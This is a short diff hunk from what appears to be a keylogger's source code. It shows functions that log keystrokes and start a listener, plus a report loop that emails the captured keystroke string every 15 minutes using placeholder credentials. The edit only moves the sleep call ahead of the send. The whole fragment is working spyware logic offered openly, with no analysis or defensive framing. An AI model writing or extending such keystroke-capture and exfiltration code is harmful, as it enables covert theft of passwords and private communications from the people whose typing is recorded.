@@ -38,11 +38,11 @@ def log_keystroke(key):
 
 def report():
     while True:
+        #sleep for 15 min
+        sleep(900)
         global input_string
         email_send.sendmail("email", "pwd", input_string)
         input_string = ""
-        #sleep for 15 min
-        sleep(900)
    
 
 def start_listener():
